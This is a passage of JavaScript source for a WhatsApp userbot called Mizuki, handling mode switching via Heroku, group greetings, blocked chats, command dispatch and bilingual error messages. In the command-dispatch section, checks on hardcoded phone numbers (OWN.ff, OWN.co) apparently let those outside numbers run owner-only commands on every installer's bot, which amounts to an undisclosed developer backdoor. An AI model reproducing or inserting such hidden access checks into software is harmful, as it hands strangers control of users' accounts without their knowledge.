            const privatemsg = '*Mizuki ප්‍රයිවට්(ඔබට පමණක් භාවිත කළ හැකි)ලෙස ක්‍රියාත්මක වේ.! 👸*\n\n_කරුණාකර මෙහි plugins භාවිත නොකරන්න. මෙය ඔබේ LOG අංකයයි._\n_ඔබට වෙනත් ඕනෑම කතාබහක දී විධානයන් භාවිත කළ හැකිය :)_\n\n*ඔබේ බොට් එක වැඩ කරන්නේ ඔබට පමණි ය. වෙනස් කිරීමට* _.setvar WORK_TYPE:public_ *විධානය භාවිතා කරන්න.*\n\n*Mizuki භාවිත කරනවාට ස්තූතියි 💌*'
            const privatemsgen = '*Mizuki Working as Private! 👸*\n\n_Please do not try plugins here. This is your LOG number._\n_You can use commands in any other chat :)_\n\n*Your bot working as private. To change it, use* _.setvar WORK_TYPE:public_\n\n*Thanks for using Mizuki 💌*'
            if (config.LANG == 'SI') { 
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, Buffer.from(pvtuserjidlog.data), MessageType.image, {mimetype: Mimetype.png, caption: EVA_ACTİON})
                } else {
                    await conn.sendMessage(conn.user.jid, Buffer.from(pvtuserjidlog.data), MessageType.image, {mimetype: Mimetype.png, caption: privatemsg});
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔹 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '```යාවත්කාලීන කිරීමට``` *.update now* ```භාවිත කරන්න.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
            else { 
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, Buffer.from(pvtuserjidlog.data), MessageType.image, {mimetype: Mimetype.png, caption: EVA_ACTİON})
                } else {
                    await conn.sendMessage(conn.user.jid, Buffer.from(pvtuserjidlog.data), MessageType.image, {mimetype: Mimetype.png, caption: privatemsgen});
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔹 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '```Type``` *.update now* ```For The Update Bot.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
        }
        else if (config.WORKTYPE == ' private' || config.WORKTYPE == 'Private' || config.WORKTYPE == ' Private' || config.WORKTYPE == 'privaye' || config.WORKTYPE == ' privaye' || config.WORKTYPE == ' prigate' || config.WORKTYPE == 'prigate' || config.WORKTYPE == 'priavte' || config.WORKTYPE == ' priavte' || config.WORKTYPE == 'PRİVATE' || config.WORKTYPE == ' PRİVATE' || config.WORKTYPE == 'PRIVATE' || config.WORKTYPE == ' PRIVATE') {

            if (config.LANG == 'SI') {

                await conn.sendMessage(
                    conn.user.jid,
                    '_ඔබට පුද්ගලික ප්‍රකාරයට මාරු වීමට අවශ්‍ය බව පෙනේ! සමාවන්න_ *WORK_TYPE* _වැරදි විධානය!_ \n_කණගාටු නොවන්න! මම උත්සාහ කරන්නේ ඔබට ගැලපෙන විධානය සොයා ගැනීමටයි .._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'private'
                    }
                })
            }
            else {
                await conn.sendMessage(
                    conn.user.jid,
                    '_It Looks Like You Want to Switch to Private Mode! Sorry, Your_ *WORK_TYPE* _Key Is Incorrect!_ \n_Dont Worry! I am Trying To Find The Right One For You.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'private'
                    }
                })
            }
        }
        else if (config.WORKTYPE == ' public' || config.WORKTYPE == 'Public' || config.WORKTYPE == ' Public' || config.WORKTYPE == 'publoc' || config.WORKTYPE == ' Publoc' || config.WORKTYPE == 'pubcli' || config.WORKTYPE == ' pubcli' || config.WORKTYPE == 'PUBLİC' || config.WORKTYPE == ' PUBLİC' || config.WORKTYPE == 'PUBLIC' || config.WORKTYPE == ' PUBLIC' || config.WORKTYPE == 'puvlic' || config.WORKTYPE == ' puvlic' || config.WORKTYPE == 'Puvlic' || config.WORKTYPE == ' Puvlic') {
            if (config.LANG == 'SI') {
                await conn.sendMessage(
                    conn.user.jid,
                    '_ඔබට පුද්ගලික ප්‍රකාරයට මාරු වීමට අවශ්‍ය බව පෙනේ! සමාවන්න_ *WORK_TYPE* _වැරදි විධානය!_ \n_කණගාටු නොවන්න! මම උත්සාහ කරන්නේ ඔබට ගැලපෙන විධානය සොයා ගැනීමටයි .._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'public'
                    }
                })
            }
            else {
                await conn.sendMessage(
                    conn.user.jid,
                    '_It Looks Like You Want to Switch to Public Mode! Sorry, Your_ *WORK_TYPE* _Key Is Incorrect!_ \n_Dont Worry! I am Trying To Find The Right One For You.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'public'
                    }
                })
            }
        }
        else {
            if (config.LANG == 'SI') {
                return await conn.sendMessage(
                    conn.user.jid,
                    '_ඔබ ඇතුළු කළ යතුර_ WORK_TYPE_ විධානය හමු නොවීය! \n_කරුණාකර .setvar WORK_TYPE:private හෝ ``.setvar WORK_TYPE:public`` කමාන්ඩ් භාවිත කරන්න', MessageType.text
                );
            }
            else {
                return await conn.sendMessage(
                    conn.user.jid,
                    '_The_ *WORK_TYPE* _Key You Entered Was Not Found!_ \n_Please Type_ ```.setvar WORK_TYPE:private``` _Or_ ```.setvar WORK_TYPE:public```', MessageType.text
                );
            }
        }
    })
    conn.on('chat-update', async m => {
        if (!m.hasNewMessage) return;
        if (!m.messages && !m.count) return;
        let msg = m.messages.all()[0];
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
        if (config.NO_ONLINE) {
            await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }       
        // ==================== End Greetings ====================    
    if (msg.messageStubType === 32 || msg.messageStubType === 28) {
        var b_greeting_type, b_logo; 
        if (config.LOGO_BYE.includes('&')) {
            var split = config.LOGO_BYE.split('&');
            b_greeting_type = split[0];
            b_logo = split[1];
        }
    if (b_greeting_type == 'IMG' | b_greeting_type == 'img') {
      var gb = await getMessage(msg.key.remoteJid, 'goodbye')
      var byelogo = await axios.get(b_logo, {responseType: 'arraybuffer'})
      if (gb !== false) {
      await conn.sendMessage(msg.key.remoteJid, Buffer.from(byelogo.data), MessageType.image, {mimetype: Mimetype.png , caption:  gb.message})
      }
    }
    else if (b_greeting_type == 'GIF' | b_greeting_type == 'gif') {
         var gb = await getMessage(msg.key.remoteJid, 'goodbye')
      var byelogo = await axios.get(b_logo, {responseType: 'arraybuffer'})
      if (gb !== false) {
      await conn.sendMessage(msg.key.remoteJid, Buffer.from(byelogo.data), MessageType.video, {mimetype: Mimetype.gif , caption:  gb.message})
      } 
    }
    return;
    }
    else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
        var w_greeting_type, w_logo; 
        if (config.LOGO_WELCOME.includes('&')) {
            var split = config.LOGO_WELCOME.split('&');
            w_greeting_type = split[0];
            w_logo = split[1];
        }
    if (w_greeting_type == 'IMG' | w_greeting_type == 'img') {
        var wl = await getMessage(msg.key.remoteJid)
        var byelogo = await axios.get(w_logo, {responseType: 'arraybuffer'})
        if (wl !== false) {
        await conn.sendMessage(msg.key.remoteJid, Buffer.from(byelogo.data), MessageType.image, {mimetype: Mimetype.png , caption:  wl.message})
        }
      }
      else if (w_greeting_type == 'GIF' | w_greeting_type == 'gif') {
        var wl = await getMessage(msg.key.remoteJid)
        var byelogo = await axios.get(w_logo, {responseType: 'arraybuffer'})
        if (wl !== false) {
        await conn.sendMessage(msg.key.remoteJid, Buffer.from(byelogo.data), MessageType.video, {mimetype: Mimetype.gif , caption:  wl.message})
        } 
      }
      return;
     }
        // ==================== Blocked Chats ====================
        if (config.BLOCKCHAT !== false) {     
            var abc = config.BLOCKCHAT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT == '94715343050-1630041500') {
            var sup = config.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SEWSUPPORT == '94785435462-1627812354') {
            var tsup = config.SEWSUPPORT.split(',');
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SEWSUPPORT2 == '94785435462-1628835469') {
            var tsup = config.SEWSUPPORT2.split(',');
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ; 
        }
        if (config.SEWSUPPORT3 == '94785435462-1628835633') {
            var tsup = config.SEWSUPPORT3.split(',');
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;    
        }
        if (config.QASUPPORT1 == '94757405652-1631633729') {
            var nsup = config.QASUPPORT1.split(',');
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.AMDANIWASA == '393475528094-1415817281') {
            var nsup = config.AMDANIWASA.split(',');
            if (msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return;
        }
        if (config.QASUPPORT2 == '94757405652-1631905677') {
            var nsup = config.QASUPPORT2.split(',');
            if (msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return;
        }
        // ==================== End Blocked Chats ====================

        // ==================== Events ====================
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = conn.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.ff == "94715343050,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.co == "94766239744,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.co.includes(',') ? OWN.co.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.co || OWN.co.includes(',') ? OWN.co.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.co)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    // ==================== End Events ====================

                    // ==================== Message Catcher ====================
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await conn.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }
                        if (msg.key.fromMe && command.deleteCommand) { 
                            var wrs = conn.user.phone.wa_version.split('.')[2]
                            if (wrs < 11) {
                                await whats.delete() 
                            }
                        } 
                        // ==================== End Message Catcher ====================

                        // ==================== Error Message ====================
                        try {
                            await command.function(whats, match);
                        }
                        catch (error) {
                            if (config.NOLOG == 'true') return;

                            if (config.LANG == 'SI' || config.LANG == 'EN') {
                                await conn.sendMessage(conn.user.jid, '*-- දෝෂ වාර්තාව [👸 Mizuki] --*' +
                                    '\n*Mizuki bot හි දෝෂයක් සිදු වී ඇත!*'+
                                    '\n_මෙම දෝශ සටහනෙහි ඔබේ අංකය හෝ SUDO අංකයක් ඇතුළත් විය හැකිය. කරුණාකර එය සමග සැලකිලිමත් වන්න!_' +
                                    '\n_උදව් සඳහා ඔබට අපගේ වට්ස්ඇප් සමූහයට පණිවුඩ දැමිය හැකිය._' +
                                    '\n_මෙම පණිවිඩය ඔබගේ log අංකයට යා යුතුව තිබුණි (සුරැකි පණිවිඩ)._' +
                                    '\n_ඔබට මෙම සමූහයට :- https://chat.whatsapp.com/HbURDOKU6Up29kmFXZUMEo දෝෂය වාර්තා කළ හැකිය._\n\n' +
                                    '*සිදුවුණු දෝෂය:* ```' + error + '```\n\n'
                                    , MessageType.text, {detectLinks: false});

                                if (error.message.includes('URL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️  දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _සහය දක්වන්නේ සත්‍ය URL වලට පමණි._' +
                                        '\n*හේතුව(පැහැදිලිව):* _Log අංකය තුළ මාධ්‍ය මෙවලම් (xmedia, sticker ..) භාවිතය._' +
                                        '\n*විසඳුම:* _විධානය Log අංකය හැර වෙනත් ඕනෑම කතාබහක භාවිතා කළ හැකිය._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _SQL Database Error_' +
                                        '\n*හේතුව(පැහැදිලිව):* _Database\'in bozulması._ ' +
                                        '\n*විසඳුම:* _දන්නා විසඳුමක් නැත.ඔබට නැවත ස්ථාපනය කිරීම උත්සාහ කළ හැකිය._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _Split of Undefined_' +
                                        '\n*හේතුව(පැහැදිලිව):* _කණ්ඩායම් පරිපාලකයින්ට භාවිතා කළ හැකි විධානයන් වරින් වර බෙදීමේ ක්‍රියාවලිය නොදකියි._ ' +
                                        '\n*විසඳුම:* _රීස්ටාර්ට් කිරීමෙන් මෙය විසඳා ගත හැක._'
                                        , MessageType.text
                                    );                               
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _Ookla Server Connection_' +
                                        '\n*හේතුව(පැහැදිලිව):* _Speedtest එකට දත්ත සම්ප්‍රේෂණය කිරීමට නොහැකි වීම._' +
                                        '\n*විසඳුම:* _ඔබ එම විධානය නැවත වරක් භාවිතා කළහොත් ගැටළුව විසඳනු ඇත._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _Requested Audio Params_' +
                                        '\n*හේතුව(පැහැදිලිව):* _ලතින් නොවන අක්ෂර වලින් ටීටීඑස් විධානය භාවිතා කරන්න._' +
                                        '\n*විසඳුම:* _ඔබ ලතින් අකුරින් විධානය භාවිතා කළහොත් ගැටළුව විසඳෙනු ඇත._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව* _එවැනි ගොනුවක් හෝ ඩිරෙක්ටරියක් නැත_' +
                                        '\n*හේතුව(පැහැදිලිව):* _ප්ලගිනය වැරදි ලෙස කෝඩ් කර ඇත._' +
                                        '\n*විසඳුම:* _කරුණාකර ප්ලගිනයේ කේත පරීක්ෂා කරන්න._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _Error 404 HTTPS_' +
                                        '\n*හේතුව(පැහැදිලිව):* _හෙරෝකු ප්ලගිනය යටතේ ඇති විධානයන් භාවිතා කිරීම හේතුවෙන් සේවාදායකයා සමඟ සන්නිවේදනය කිරීමට නොහැකි වීම._' +
                                        '\n*විසඳුම:* _ටික වේලාවක් බලා නැවත උත්සාහ කරන්න. ඔබ තවමත් දෝෂයක් ලබා ගන්නේ නම්, වෙබ් අඩවියේ මෙහෙයුම සිදු කරන්න._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _Reply Delete Function_' +
                                        '\n*හේතුව(පැහැදිලිව):* _img හෝ wiki විධානයන් භාවිතා කිරීම._' +
                                        '\n*විසඳුම:* _මෙම දෝෂයට විසඳුමක් නොමැත. එය ලොකු දෝෂයක් නොවේ._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _Reply Delete Function_' +
                                        '\n*හේතුව(පැහැදිලිව):* _img හෝ wiki විධානයන් භාවිතා කිරීම._' +
                                        '\n*විසඳුම* _මෙම දෝෂයට විසඳුමක් නොමැත. එය ලොකු දෝෂයක් නොවේ.__'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _Bailyes Action Error_ ' +
                                        '\n*හේතුව(පැහැදිලිව)* _නිශ්චිත හේතුව නොදනී. විකල්ප කිහිපයක්ම මෙම දෝෂය ඇති කිරීමට හේතු වන්නට ඇත._' +
                                        '\n*විසඳුම:* _ඔබ එය තවත් වරක් භාවිතා කළහොත් එය නිවැරදි කළ හැකිය. දෝෂය පවතින්නේ නම්, ඔබට නැවත ආරම්භ කිරීම උත්සාහ කළ හැකිය._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _Cannot Decode Text or Media_' +
                                        '\n*හේතුව(පැහැදිලිව):* _ප්ලගිනය වැරදි ලෙස භාවිතා කිරීම._' +
                                        '\n*විසඳුම:* _ප්ලගිනය විස්තරයේ ලියා ඇති පරිදි කරුණාකර විධානයන් භාවිතා කරන්න._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!`` ==========' +
                                        '\n\n*හේතුව:* _Word Character Usage_' +
                                        '\n*හේතුව(පැහැදිලිව):* _ඉංග්‍රීසි හෝ ලතින් හෝඩියෙන් පිටත TTP, ATTP වැනි විධානයන් භාවිතා කිරීම._' +
                                        '\n*විසඳුම:* _ඉංග්‍රීසි භාෂාව හෝ ලතින් භාෂාව භාවිත කරන්න.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ දෝෂ විසඳුම් [MIZUKI] ⚕️*' +
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*හේතුව:* _Deleting Plugin_' +
                                        '\n*හේතුව(පැහැදිලිව):* _ප්ල්ගීනයක් ඉවත් කිරීමේදී නම වැරදි ලෙස ඇතුළත් කිරීම._' +
                                        '\n*විසඳුම:* _ඔබට මැකීමට අවශ්‍ය ප්ලගිනයට _ * __ * _ එකතු නොකර කරුණාකර උත්සාහ කරන්න. ඔබ තවමත් දෝෂයක් ලබා ගන්නේ නම්, නම අවසානයේ ""? (.*) / $ "" වැනි සම්පූර්ණ ප්‍රකාශන පුරවන්න._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await conn.sendMessage(conn.user.jid, '*🙇🏻 කණගාටුයි මට මෙම දෝෂය කියවීමට නොහැකි වුනා!! 🙇🏻*' +
                                        '\n_වැඩිදුර උදව් සඳහා ඔබට අපගේ Support group :- https://chat.whatsapp.com/HbURDOKU6Up29kmFXZUMEo එකට පැමිණිය හැකිය._'
                                        , MessageType.text
                                    );
                                }
                            }
                            else {
                                await conn.sendMessage(conn.user.jid, '*-- ERROR REPORT [MIZUKI] --*' +
                                    '\n* An error has occurred!*'+
                                    '\n_This error log may include your number or the number of an opponent. Please be careful with it!_' +
                                    '\n_You can write to our Telegram group for help._' +
                                    '\n_Aslo you can join our support group:_ https://chat.whatsapp.com/HbURDOKU6Up29kmFXZUMEo' +
                                    '\n_This message should have gone to your number (saved messages)._\n\n' +
                                    '*Error:* ```' + error + '```\n\n'
                                    , MessageType.text, {detectLinks: false}
                                );
                                if (error.message.includes('URL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Only Absolutely URLs Supported_' +
                                        '\n*Reason:* _The usage of media tools (xmedia, sticker..) in the LOG number._' +
                                        '\n*Solution:* _You can use commands in any chat, except the LOG number._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Deleting Plugin_' +
                                        '\n*Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
                                        '\n*Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Split of Undefined_' +
                                        '\n*Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
                                        '\n*Solution:* _Restarting will be enough._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _SQL Database Error_' +
                                        '\n*Reason:* _Database corruption._ ' +
                                        '\n*Solution:* _There is no known solution. You can try reinstalling it._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Ookla Server Connection_' +
                                        '\n*Reason:* _Speedtest data cannot be transmitted to the server._' +
                                        '\n*Solution:* _If you use it one more time the problem will be solved._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Requested Audio Params_' +
                                        '\n*Reason:* _Using the TTS command outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin letters frame._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved``` ==========' +
                                        '\n\n*Main Error:* _No Such File or Directory_' +
                                        '\n*Reason:* _Incorrect coding of the plugin._' +
                                        '\n*Solution:* _Please check the your plugin codes._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Error 404 HTTPS_' +
                                        '\n*Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
                                        '\n*Solution:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Bailyes Action Error_ ' +
                                        '\n*Reason:* _The exact reason is unknown. More than one option may have triggered this error._' +
                                        '\n*Solution:* _If you use it again, it may improve. If the error continues, you can try to restart._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
